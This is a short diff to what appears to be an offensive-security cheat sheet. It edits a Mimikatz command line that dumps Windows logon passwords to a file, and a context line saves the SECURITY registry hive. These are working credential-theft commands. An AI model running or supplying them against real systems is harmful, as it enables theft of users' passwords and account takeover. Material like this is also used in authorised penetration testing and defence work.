@@ -14,7 +14,7 @@ reg save hklm\security security.save
 ### Mimikatz
 
 ```
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
+mimikatz.exe "privilege::debug" " sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
 ```
 
 ## A distance
